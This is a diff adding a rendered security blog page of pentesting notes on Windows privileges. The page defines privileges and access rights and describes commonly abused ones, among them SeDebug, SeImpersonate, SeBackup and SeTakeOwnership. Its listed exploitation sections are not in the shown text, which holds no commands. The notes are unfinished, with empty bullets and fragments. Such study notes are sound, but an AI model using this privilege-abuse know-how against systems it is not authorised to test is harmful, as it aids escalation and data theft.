@@ -1,0 +1,1619 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.135.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta
+                name="author"
+                content="Bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Windows Privileges |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
+                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Windows Privileges -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Box Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Posts </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/20240405141322-ad_access_control_list_acls/" title="./posts/20240405141322-ad_access_control_list_acls/">
+                        
+                            AD ACL Access Control List (ACLs)
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/20240404085958-windows_privileges/" title="./posts/20240404085958-windows_privileges/">
+                        
+                            Windows Privileges
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/outdated-box/" title="./outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Windows Privileges
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                Bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="0001.01.01"
+                            >0001.01.01
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        13 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/posts/" class="bread-btn">
+    
+
+    
+        Posts
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/posts/20240404085958-windows_privileges/" class="bread-btn">
+    
+
+    
+        
+            Windows Privileges
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#windows-privileges">Windows Privileges:</a></li>
+    <li><a href="#disabled-privileges">Disabled Privileges:</a></li>
+    <li><a href="#difference-between-access-rights-user-rights-privileges">Difference Between access rights, user rights, privileges:</a>
+      <ul>
+        <li><a href="#privileges-vs-dot-access-rights">Privileges vs. Access Rights:</a></li>
+      </ul>
+    </li>
+    <li><a href="#commonly-abused-privileges">Commonly Abused Privileges:</a>
+      <ul>
+        <li><a href="#system-and-service-operations-privileges">System and Service Operations Privileges:</a></li>
+        <li><a href="#security-and-auditing-privileges">Security and Auditing Privileges:</a></li>
+        <li><a href="#file-and-directory-operations">File and Directory Operations:</a></li>
+      </ul>
+    </li>
+    <li><a href="#grants-a-user-the-ability-to-take-ownership-of-various-files-securable-objects-are-just-files">Grants a user the ability to take ownership of various &ldquo;&quot;(Files, securable objects are just files):</a>
+      <ul>
+        <li><a href="#token-and-access-rights-privileges">Token and Access Rights Privileges:</a></li>
+        <li><a href="#system-configuration-and-environment-privileges">System Configuration and Environment Privileges:</a></li>
+      </ul>
+    </li>
+    <li><a href="#restricted-access-tokens">Restricted Access Tokens:</a></li>
+    <li><a href="#a65346"><del>Enumerating Windows Privileges</del>:</a></li>
+    <li><a href="#ba3154"><del>Attacking Windows Privileges</del>:</a>
+      <ul>
+        <li><a href="#activate-disabled-privileges--org1d6aa6b">Activate <a href="#disabled-privileges">Disabled Privileges</a>:</a></li>
+        <li><a href="#exploiting-seimpersonateprivilege--org5249bab--and-seassignprimarytokenprivilege--org170fdda">Exploiting <a href="#seimpersonateprivilege">SeImpersonatePrivilege</a> &amp; <a href="#seassignprimarytokenprivilege">SeAssignPrimaryTokenPrivilege</a>:</a></li>
+        <li><a href="#exploiting-sedebugprivilege--org09b3fe5">Exploiting <a href="#sedebugprivilege">SeDebugPrivilege</a>:</a></li>
+        <li><a href="#exploiting-setakeownershipprivilege--orge9f7456">Exploiting <a href="#setakeownershipprivilege">SeTakeOwnershipPrivilege</a>:</a></li>
+        <li><a href="#exploiting-sebackupprivilege--org6c67be4--and-serestoreprivilege--org6b8db47">Exploiting <a href="#sebackupprivilege">SeBackupPrivilege</a> &amp; <a href="#serestoreprivilege">SeRestorePrivilege</a>:</a></li>
+        <li><a href="#exploiting-seloaddriverprivilege--org4c7e104">Exploiting <a href="#seloaddriverprivilege">SeLoadDriverPrivilege</a>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#defending-windows-privilege-abuse"><code>Defending Windows Privilege Abuse</code>:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="windows-privileges">Windows Privileges:</h2>
+<ul>
+<li>
+<p>Definition</p>
+<ul>
+<li>Special rights assigned to user accounts or groups.</li>
+<li>Allow users to perform specific actions that affect the entire system or other users.</li>
+</ul>
+</li>
+<li>
+<p>Examples</p>
+<ul>
+<li>Change the system time
+<ul>
+<li>Allows user to modify the system clock.</li>
+</ul>
+</li>
+<li>Shut down the system
+<ul>
+<li>Grants the ability to power off or restart the computer.</li>
+</ul>
+</li>
+<li>Load and unload device drivers
+<ul>
+<li>Permits the installation and removal of system drivers.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Administration</p>
+<ul>
+<li>Managed through Group Policy and user account settings.</li>
+<li>Can be tailored for specific roles and responsibilities.</li>
+</ul>
+</li>
+<li>
+<p>Security Implications</p>
+<ul>
+<li>High privileges can pose security risks if misused or exploited.</li>
+<li>Principle of Least Privilege recommends minimizing user privileges to reduce attack vectors.</li>
+</ul>
+</li>
+</ul>
+<h2 id="disabled-privileges">Disabled Privileges:</h2>
+<ul>
+<li>When a privilege is listed in the <code>Disabled</code> state it maeans that our account has it asssigned but we cannot actually perform it until it is enabled.</li>
+<li>Windows does not have a cmdlet to enable privs.</li>
+</ul>
+<h2 id="difference-between-access-rights-user-rights-privileges">Difference Between access rights, user rights, privileges:</h2>
+<ul>
+<li></li>
+<li></li>
+<li></li>
+</ul>
+<h3 id="privileges-vs-dot-access-rights">Privileges vs. Access Rights:</h3>
+<ul>
+<li>
+<p>Privileges:</p>
+<ul>
+<li>Allow performing system-related operations (e.g., shutting down the system, loading device drivers).</li>
+<li>Assigned to user and group accounts by a system administrator.</li>
+<li>Govern access to system resources and tasks.</li>
+</ul>
+</li>
+<li>
+<p>Access Rights:</p>
+<ul>
+<li>Control access to securable objects.</li>
+<li>Granted or denied by the system based on ACEs in the object&rsquo;s DACL.</li>
+</ul>
+</li>
+<li>
+<p>Privilege Management</p>
+<ul>
+<li>Accounts and Privileges:
+<ul>
+<li>Each system has an account database storing privileges for user and group accounts.</li>
+<li>Upon user login, an access token is created, listing the user&rsquo;s privileges.</li>
+<li>Privileges apply only to the local computer; domain accounts can have different privileges on different systems.</li>
+</ul>
+</li>
+<li>Privilege Verification and Enforcement:
+<ul>
+<li>When a privileged operation is attempted, the system checks the user&rsquo;s access token for the necessary privileges and whether they are enabled.</li>
+<li>Operations are not performed if the required privileges are not held or are disabled.</li>
+</ul>
+</li>
+<li>Privilege Identification:
+<ul>
+<li>Windows API uses string constants (e.g., SE_ASSIGNPRIMARYTOKEN_NAME) for privilege identification, defined in Winnt.h.</li>
+<li>Privileges are identified in access tokens using the LUID type, which can vary across computers and boots.</li>
+<li>Functions like LookupPrivilegeValue and LookupPrivilegeName map between string constants and LUIDs.</li>
+</ul>
+</li>
+<li>Display Names for Privileges:
+<ul>
+<li>The system provides display names for each privilege, retrievable using LookupPrivilegeDisplayName (e.g., &ldquo;Change the system time&rdquo; for SE_SYSTEMTIME_NAME).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Programming and Administrative Tools</p>
+<ul>
+<li>Checking Privileges:
+<ul>
+<li>The GetTokenInformation function determines the privileges in an access token and which are enabled.</li>
+<li>The PrivilegeCheck function checks if an access token holds a specific set of privileges, useful for server applications impersonating a client.</li>
+</ul>
+</li>
+<li>Administrative Tools:
+<ul>
+<li>Tools like User Manager allow administrators to add or remove privileges for accounts.</li>
+</ul>
+</li>
+<li>Local Security Authority (LSA) Functions:
+<ul>
+<li>LsaAddAccountRights and LsaRemoveAccountRights to add or remove privileges from an account.</li>
+<li>LsaEnumerateAccountRights to list privileges held by an account.</li>
+<li>LsaEnumerateAccountsWithUserRight to list accounts holding a specified privilege.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="commonly-abused-privileges">Commonly Abused Privileges:</h2>
+<h3 id="system-and-service-operations-privileges">System and Service Operations Privileges:</h3>
+<h4 id="setcbprivilege">SeTcbPrivilege:</h4>
+<ul>
+<li>Allows a process to perform tasks usually reserved for the operating system, providing high-level control over system functions.</li>
+</ul>
+<h4 id="sedebugprivilege">SeDebugPrivilege:</h4>
+<ul>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs</a></p>
+</li>
+<li>
+<p>Can be used to dump</p>
+</li>
+<li>
+<p>SeDebugPrivilege Overview</p>
+<ul>
+<li>Enables a user to attach a debugger to any process, facilitating troubleshooting and system analysis.</li>
+</ul>
+</li>
+<li>
+<p>Purpose:</p>
+<ul>
+<li>Allows a user to run specific applications or services, and assist with troubleshooting without being added to the administrators group.</li>
+</ul>
+</li>
+<li>
+<p>Assignment Method:</p>
+<ul>
+<li>Via local or domain group policy: Computer Settings &gt; Windows Settings &gt; Security Settings.</li>
+</ul>
+</li>
+<li>
+<p>Default Assignment:</p>
+<ul>
+<li>By default, this privilege is granted only to administrators.</li>
+</ul>
+</li>
+<li>
+<p>Usage Context:</p>
+<ul>
+<li>Often assigned to developers for debugging new system components.</li>
+</ul>
+</li>
+<li>
+<p>Security Considerations:</p>
+<ul>
+<li>Can be used to capture sensitive information from system memory or access/modify kernel and application structures.</li>
+<li>Should be granted sparingly due to potential access to critical operating system components.</li>
+</ul>
+</li>
+</ul>
+<h4 id="seloaddriverprivilege">SeLoadDriverPrivilege:</h4>
+<ul>
+<li>Permits the dynamic loading and unloading of device drivers, which can be essential for system updates or configuration changes.
+<ul>
+<li>Being part of the <a href="">Print Operators Group:</a> provides this privilege by default.</li>
+</ul>
+</li>
+</ul>
+<h4 id="seassignprimarytokenprivilege">SeAssignPrimaryTokenPrivilege:</h4>
+<ul>
+<li>Allows a process to assign a primary token to a process, effectively altering the security context under which the process runs.</li>
+</ul>
+<h4 id="seenabledelegationprivilege">SeEnableDelegationPrivilege:</h4>
+<ul>
+<li>Grants the ability to mark user and computer accounts as delegatable, enabling advanced Kerberos authentication scenarios.</li>
+</ul>
+<h4 id="seimpersonateprivilege">SeImpersonatePrivilege:</h4>
+<ul>
+<li>
+<p>take advantage of these privileges.</p>
+</li>
+<li>
+<p>A security privilege in Windows that allows a process to adopt the security context of another user, typically after that user has been authenticated.</p>
+</li>
+<li>
+<p>Essential for scenarios where a service (like SQL Server or IIS) needs to perform operations on behalf of an authenticated user, particularly when accessing resources that require user-specific permissions.</p>
+</li>
+<li>
+<p><strong>Impersonation with</strong> <code>SeImpersonatePrivilege</code>:</p>
+<ul>
+<li><!-- raw HTML omitted -->Overview<!-- raw HTML omitted -->:
+<ul>
+<li>Every process has an associated token that represents the identity and privileges of the account that initiated the process.</li>
+<li>The token contains security information like user identity, group memberships, and associated privileges.</li>
+<li>This token is automatically assigned when the process starts, based on the account under which the process is running (e.g., a system account or a user account).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impersonation Using</strong> <code>SeImpersonatePrivilege</code>:</p>
+<ul>
+<li>When a service impersonates a user, it temporarily uses the user&rsquo;s token to perform actions with the user&rsquo;s permissions.
+<ul>
+<li>The service can access resources (like file shares) that the user is allowed to access.</li>
+<li>The privilege allows the process running the service to &ldquo;borrow&rdquo; the identity of another user securely.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Summarized</strong>: The token of each process defines what that process can do, based on the permissions of the account running it. <code>SeImpersonatePrivilege</code> allows services to use another user&rsquo;s token for performing tasks on their behalf.</p>
+</li>
+<li>
+<p><strong>Usage Context</strong>:</p>
+<ul>
+<li>In the context of SQL Server or IIS using Windows Authentication, <code>SeImpersonatePrivilege</code> enables these services to perform tasks under the security context of the connected user, ensuring that operations adhere to the principle of least privilege and respect user-specific access controls.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Example of Impersonate Privilege Working:</p>
+<ul>
+<li>
+<p><strong>How Impersonation Works</strong>:</p>
+<ul>
+<li>The client connects to the service using their credentials (via Windows Authentication).</li>
+<li>The service, upon needing to access other resources (like file shares), uses the client&rsquo;s identity instead of its own.</li>
+<li>This is possible because the service account is given a special privilege called &ldquo;Impersonate a client after authentication&rdquo;.</li>
+</ul>
+</li>
+<li>
+<p><strong>Simple Text-Based Diagram of Impersonation Mechanism Working</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="[Client]%0a%20%20%20%20%7c%0a%20%20%20%20%7c%20%281%29%20Authenticates%20using%20Windows%20Auth%0a%20%20%20%20v%0a[Server%20%28SQL/IIS%29]%0a%20%20%20%20%7c%0a%20%20%20%20%7c%20%282%29%20Needs%20to%20access%20other%20resources%0a%20%20%20%20v%0a[Impersonation%20Process]%0a%20%20%20%20%7c%0a%20%20%20%20%7c%20%283%29%20Server%20adopts%20the%20client%27s%20identity%0a%20%20%20%20v%0a[Other%20Resources]%0a%20%20%28e.g.,%20File%20Shares%29">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>[Client]
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | (1) Authenticates using Windows Auth
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>[Server (SQL/IIS)]
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | (2) Needs to access other resources
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>[Impersonation Process]
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | (3) Server adopts the client&#39;s identity
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>[Other Resources]
+</span></span><span style="display:flex;"><span>  (e.g., File Shares)</span></span></code></pre></div>
+    
+</div>
+<ol>
+<li><strong>Client to Server Authentication</strong>: The client authenticates to the server using Windows authentication.</li>
+<li><strong>Resource Request</strong>: The server requires access to additional resources (like files).</li>
+<li><strong>Impersonation</strong>: The server impersonates the client&rsquo;s identity to gain the same permissions the client has.</li>
+<li><strong>Access Resources</strong>: The server, acting as the client, accesses external resources (file shares, etc.).</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="security-and-auditing-privileges">Security and Auditing Privileges:</h3>
+<h4 id="sesecurityprivilege">SeSecurityPrivilege:</h4>
+<ul>
+<li>Grants the ability to manage and configure security policies, view and clear security logs, which is vital for maintaining system security.</li>
+</ul>
+<h4 id="seauditprivilege">SeAuditPrivilege:</h4>
+<ul>
+<li>Allows the generation of audit logs for tracking user activities and system changes, aiding in compliance and security monitoring.</li>
+</ul>
+<h3 id="file-and-directory-operations">File and Directory Operations:</h3>
+<h4 id="sebackupprivilege">SeBackupPrivilege:</h4>
+<ul>
+<li>
+<p><del>This will let us copy a file from a folder, even if there is no access control entry</del> () for us in the folder&rsquo;s access control list (<a href="/posts/20240405141322-ad_access_control_list_acls/">ACL</a>).</p>
+<ul>
+<li><del>!!!</del> However, we can&rsquo;t do this using the standard copy command. <del>!!!</del></li>
+<li>Instead, we need to programmatically copy the data, making sure to specify the <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">FILE_FLAG_BACKUP_SEMANTICS</a> flag.</li>
+</ul>
+</li>
+<li>
+<p><strong>Member of the</strong> <a href="">Backup Operators Group</a> <strong>&amp;</strong> <a href="">Server Operators:</a> <strong>get this privilege by default</strong>:</p>
+<ul>
+<li>Check attacks here too.</li>
+</ul>
+</li>
+<li>
+<p>Provides read access to all files and directories for backup purposes, bypassing standard permissions.</p>
+</li>
+<li>
+<p>Purpose</p>
+<ul>
+<li>Allows a process to read any file, regardless of the file&rsquo;s permissions.</li>
+<li>Used primarily for backup applications that need access to all files.</li>
+</ul>
+</li>
+<li>
+<p>Key Characteristics</p>
+<ul>
+<li>Bypasses standard file read permissions.</li>
+<li>Does not enable writing or deleting files, only reading.</li>
+<li>Typically assigned to backup software or administrative tasks.</li>
+</ul>
+</li>
+<li>
+<p>Security Considerations</p>
+<ul>
+<li>High potential for abuse if granted to unauthorized applications or users.</li>
+<li>Should be closely monitored and restricted to trusted applications and personnel.</li>
+</ul>
+</li>
+<li>
+<p>Default Assignment</p>
+<ul>
+<li>Typically assigned to backup software or services during installation or configuration.</li>
+</ul>
+</li>
+<li>
+<p>Use in Penetration Testing</p>
+<ul>
+<li>Identifying misuse or over-assignment can indicate potential vulnerabilities.</li>
+<li>Exploiting improperly secured SeBackupPrivilege could allow reading sensitive files.</li>
+</ul>
+</li>
+</ul>
+<h4 id="serestoreprivilege">SeRestorePrivilege:</h4>
+<ul>
+<li>
+<p><strong>Member of the</strong> <a href="">Backup Operators Group</a> <strong>&amp;</strong> <a href="">Server Operators:</a> <strong>get this privilege by default</strong>:</p>
+</li>
+<li>
+<p>Allows write access to all files and directories for restoration purposes, overriding standard access controls.</p>
+</li>
+<li>
+<p>Purpose</p>
+<ul>
+<li>Enables a process to write to any file, regardless of the file&rsquo;s permissions.</li>
+<li>Primarily used by restoration applications to recover files and directories.</li>
+</ul>
+</li>
+<li>
+<p>Key Characteristics</p>
+<ul>
+<li>Bypasses standard file write permissions.</li>
+<li>Allows setting any file attributes, including those that govern file access permissions.</li>
+<li>Does not permit reading or deleting files, only writing and attribute manipulation.</li>
+</ul>
+</li>
+<li>
+<p>Security Considerations</p>
+<ul>
+<li>Significant potential for misuse if allocated to unauthorized applications or users.</li>
+<li>Access should be closely controlled and limited to trusted applications and personnel.</li>
+</ul>
+</li>
+<li>
+<p>Default Assignment</p>
+<ul>
+<li>Not provided to users by default.</li>
+<li>Usually granted to restoration software or services during their installation or setup.</li>
+</ul>
+</li>
+<li>
+<p>Use in Penetration Testing</p>
+<ul>
+<li>Discovering improper allocation or misuse can reveal security weaknesses.</li>
+<li>Exploitation of inadequately secured SeRestorePrivilege could allow unauthorized file modifications or system configurations.</li>
+</ul>
+</li>
+</ul>
+<h4 id="setakeownershipprivilege">SeTakeOwnershipPrivilege:</h4>
+<ul>
+<li>
+<p><strong>SeTakeOwnershipPrivilege Overview</strong>:</p>
+<ul>
+<li>
+<h2 id="grants-a-user-the-ability-to-take-ownership-of-various-files-securable-objects-are-just-files">Grants a user the ability to take ownership of various &ldquo;&quot;(Files, securable objects are just files):</h2>
+<ul>
+<li>NTFS files/folders</li>
+<li>Printers</li>
+<li></li>
+<li>Services</li>
+<li>Processes</li>
+</ul>
+</li>
+<li>Provides rights, enabling the user to change the owner in the object&rsquo;s .
+<ul>
+<li>Typically assigned to Administrators by default.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Issueing the privilege</strong>:</p>
+<ul>
+<li>Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment</li>
+</ul>
+</li>
+<li>
+<p><strong>Usage Contexts</strong>:</p>
+<ul>
+<li>Rare for standard user accounts to have this privilege.</li>
+<li>More commonly seen with service accounts, e.g., those running backup jobs and VSS snapshots.</li>
+</ul>
+</li>
+<li>
+<p><strong>Related Privileges</strong>:</p>
+<ul>
+<li>Service accounts with SeTakeOwnershipPrivilege might also have:
+<ul>
+<li><a href="#sebackupprivilege">SeBackupPrivilege</a></li>
+<li><a href="#serestoreprivilege">SeRestorePrivilege</a></li>
+<li><a href="#sesecurityprivilege">SeSecurityPrivilege</a></li>
+</ul>
+</li>
+<li>These are to control the account&rsquo;s privileges more granularly without full local admin rights.</li>
+</ul>
+</li>
+<li>
+<p><strong>Privilege Escalation Potential</strong>:</p>
+<ul>
+<li>While these privileges can potentially be used for privilege escalation, there are situations where taking ownership of specific files is necessary, especially when other methods are blocked or ineffective.</li>
+</ul>
+</li>
+</ul>
+<h3 id="token-and-access-rights-privileges">Token and Access Rights Privileges:</h3>
+<h4 id="secreatetokenprivilege">SeCreateTokenPrivilege:</h4>
+<ul>
+<li>Allows a process to create access tokens, which can be used to define security contexts for user impersonation and process execution.</li>
+</ul>
+<h3 id="system-configuration-and-environment-privileges">System Configuration and Environment Privileges:</h3>
+<h4 id="sesystemenvironmentprivilege">SeSystemEnvironmentPrivilege:</h4>
+<ul>
+<li>Grants the ability to modify system environment settings, including BIOS and firmware configurations, which can affect hardware operation and system startup.</li>
+</ul>
+<h4 id="semachineaccountprivilege">SeMachineAccountPrivilege:</h4>
+<ul>
+<li>See</li>
+<li>Purpose: Grants the right to a user or group to create and join computer accounts to the domain.</li>
+<li>Associated Privilege: Held by users/groups like Domain Admins or delegated users who need to add computers to the domain.</li>
+<li>Location: This is a specific user right assignment in the Local Security Policy.</li>
+<li>Default Holders:
+<ul>
+<li>Domain Administrators.</li>
+<li>Members of groups delegated for computer account management.</li>
+</ul>
+</li>
+<li>Security Implications:
+<ul>
+<li>Attackers who gain this privilege can create new computer accounts or rejoin existing ones, which can lead to domain persistence or other attacks.</li>
+<li>Should be tightly controlled and audited to prevent abuse.</li>
+</ul>
+</li>
+</ul>
